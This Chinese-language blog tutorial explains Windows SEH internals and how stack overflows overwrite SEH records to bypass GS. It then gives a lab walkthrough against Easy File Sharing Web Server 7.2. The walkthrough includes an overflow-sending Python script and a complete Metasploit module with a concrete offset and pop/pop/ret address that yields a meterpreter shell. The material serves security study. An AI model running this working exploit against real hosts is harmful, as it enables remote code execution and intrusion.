---
title: 攻击windows异常处理机制SEH
date: 2020-05-22 21:13:03
id: 20200522211303
tags: 
	- 逆向
	- windows异常处理
categories: 网络安全
description: 介绍windows异常处理机制中的SEH，详细介绍SEH的工作原理和如何通过栈溢出实现利用SEH来绕过GS。
---

# 0x00 简介

本文主要有两个部分。第一部分介绍windows异常处理机制中的SEH，详细介绍SEH的工作原理。第二部分介绍如何通过栈溢出实现利用SEH来绕过GS。

# 0x01 SEH（异常处理结构体）

SEH的全称是Structure Exception Handler，翻译为异常处理结构体，它是Windows异常处理机制所采用的的重要数据结构。每个SEH结构体包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共八个字节。如下图：

![](https://superj.oss-cn-beijing.aliyuncs.com/20200522212236.png)

#### 对SEH的初步理解，我们要了解一下几点：

1. S.E.H结构体存放在系统栈中。
2. 当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。
3. 如果程序源代码中使用了`__try{}__except{}`或者`Assert`宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。
4. 栈中一般会同时存在多个S.E.H。
5. 栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识，FS寄存器指向TEB的位置。
6. 当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。
7. 当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。
8. 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。

#### 大概了解SEH的工作原理后，发现以下问题：

1. S.E.H存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。
2. 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。
3. 溢出后错误的栈帧或堆块数据往往会触发异常。
4. 当Windows开始处理溢出后的异常时，会错误地把shellcode当做异常处理函数而执行。

这样，就可以绕过GS这种栈的保护机制，不通过一出道返回地址，而是溢出修改SEH结构的异常处理函数的句柄，从而实现攻击。

> 注：异常处理机制和堆分配机制一样，会检测进程是否处于调试状态。异常处理在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。

# 0x02 详解SEH工作中的栈空间

上面我们简单介绍了Windows在处理异常时的工作流程，但是我们如果要利用SEH来达到攻击的目的，则还需要知道在异常处理的时候的栈空间的状态。

在程序运行过程中，当触发了异常，程序尝试处理异常的时候，首先系统会执行异常的回调函数。

```c
 
EXCEPTION_DISPOSITION
__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,
                        void * EstablisherFrame,
                        struct _CONTEXT *ContextRecord,
                        void * DispatcherContext);
```

并在栈中压入一个`EXCEPTION_DISPOSITION Handler`结构，如下图。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200522220053.png)

这个时候，esp指向栈顶位置就是这个结构体。这个结构体中包含这从TEB中得到的第一个SEH结构体的位置。这个时候，通过Establisher Frame找到第一个SEH结构体的位置，执行异常处理函数。

> 注：这一块栈空间的变化可以参考[逆向与破解-windows异常处理机制](https://blog.csdn.net/iamsongyu/article/details/102860309)

# 0x03 利用SEH

我们知道了SEH的工作原理和执行时的栈空间的变化，接下来我们学习如何利用栈溢出，达到利用SEH进行攻击的方法。

#### 基本步骤：

1. 首先要得到溢出点到SEH结构体的偏移量。
2. 然后要得到shellcode的起始位置。
3. 触发异常。

以上步骤是最基本的，在真实的环境中我们还需要考虑其他因素。比如，在第二步中，理论上我们将SEH的后4个字节修改成shellcode的起始地址就可以了，但是如果开启了地址随机化，我们的shellcode的地址就无法准确的找到。所以一般是找未开启SafeSEH保护的`pop/pop/ret`的代码段，通过这个代码段跳转到shellcode中。为什么要利用PPR代码段，看下面。

# 0x04 为什么需要PPR来利用SEH

我们分析上面那张栈空间的图可以发现，当触发异常时，此时的esp指向的是`EXCEPTION_DISPOSITION Handler`，当执行异常处理函数，PPR时，esp向高地址移动8个字节，指向了Establisher Frame，存着第一个SEH的地址，因此执行ret会将eip指向SEH，此时如果SEH的前两个字节为`EB06`，则会执行jmp指令，向下跳转6个字节，如果下面是一堆nop跟着shellcode，则会顺利滑进shellcode，成功执行。

# 0x05 实践

实验环境：windows xp、kali

实验软件：Easy File Sharing Web Server 7.2、Immunity Debugger

实验步骤：

1. 首先先生成一段用于溢出的字符串。

   这里用到的工具是kali下msf自带的一个生成脚本pattern_create.rb。

   ```shell
   msf-pattern_create -l 10000 > 1.txt
   ```

2. xp上打开Easy File Sharing Web Server 7.2，并启动服务。用Immunity Debugger调试器attach到EFSWS的进程上，并点击run，使程勋运行中。

3. 通过脚本将字符串发给xp的80端口。

   ```python
   import socket
   import sys
    
   host = str(sys.argv[1])
   port = int(sys.argv[2])
    
   a = socket.socket()
    
   print "Connecting to: " + host + ":" + str(port)
   a.connect((host,port))
    
    
   # 这里是上一步生成的1.txt文件的内容
   buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2..."
    
   a.send("HEAD " + buff + " HTTP/1.0\r\n\r\n")
    
   a.close()
    
   print "Done..."
   ```

4. 打开Immunity Debugger的SEH chain，可发现如下图所示。

   ![](https://superj.oss-cn-beijing.aliyuncs.com/20200523154502.png)

   这里面显示的当前的SEH的handler为0x46356646，指向的下一个SEH的地址为0x34664633。因此，我们溢出字符串覆盖的SEH结构体的值为0x3466463346356646。

5. 查找0x34664633在溢出字符串中的偏移量。这里为什么是前4个字节，因为pattern_offset工具找的是四个字节在pattern中的偏移位置，所以我们只需要知道SEH结构体的前四个字节中的值对应的偏移。

   ```shell
   msf-pattern_offset -q 34664633
   ```

   执行后，获得偏移量。

   ![](https://superj.oss-cn-beijing.aliyuncs.com/20200523155744.png)

6. 通过Immunity Debugger的mona插件，寻找该程序中可以利用的dll模块。

   ```shell
   !mona modules
   ```

   <img src="https://superj.oss-cn-beijing.aliyuncs.com/20200523164151.png" style="zoom: 33%;" />

7. 找到其中未开启SafeSEH的可利用模块，这里选择第一个ImageLoad.dll，并通过msfbinscan找其中的PPR。

   <img src="https://superj.oss-cn-beijing.aliyuncs.com/20200523164438.png" style="zoom:50%;" />

8. 写exp，并将脚本放入msf的exploit的目录下，以让msf能够找到攻击脚本。

   ```ruby
   require 'msf/core'
   class MetasploitModule < Msf::Exploit::Remote
     Rank = NormalRanking
     include Msf::Exploit::Remote::Tcp
     include Msf::Exploit::Seh
   
     def initialize(info = {})
       super(update_info(info,
         'Name'            => 'Easy File Sharing HTTP Server 7.2 SEH Overflow',
         'Description'     => %q{
           This Module Demonstrate SEH based overflow example
         },
         'Author'          => 'yanhan',
   
         'Payload'         =>
           	{
             		'Space'       => 390,
             		'BadChars'    => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"
           	},
         'Platform'      => 'Windows',
         'Targets'       =>
            		 [
               		   [
                 		   'Easy File Sharing 7.2 HTTP',
                 			{
                   		'Ret'       => 0x100188fc,
                   		'Offset'    => 4061
                 			}
               		   ]
             		 ],
         'DisclosureDate'  => '2019-01-16',
     ))
     end
   
     def exploit
       connect
       weapon = "HEAD "
       weapon << make_nops(target['Offset'])
       weapon << generate_seh_record(target['Ret'])
       weapon << make_nops(20)
       weapon << payload.encoded
       weapon << " HTTP/1.0\r\n\r\n"
       sock.put(weapon)
       handler
       disconnect
      end
   end
   
   ```

   在脚本中Ret值是我们找到的PPR的地址，Offset是我们找到的溢出点。

9. msf中运行攻击脚本获得目标xp的meterpreter。

   ![](https://superj.oss-cn-beijing.aliyuncs.com/20200523165943.png)

参考自杨老师[SEH异常处理机制的栈溢出攻击及shell提取](https://blog.csdn.net/Eastmount/article/details/104593520)。

# 0x06 总结

成功之后，思考通过mona找到了很多的dll，其中也有别的没有开SafeSEH，是不是也可以加以利用。实践发现在系统dll文件msasn1.dll中的0x76218422也有PPR可以利用。

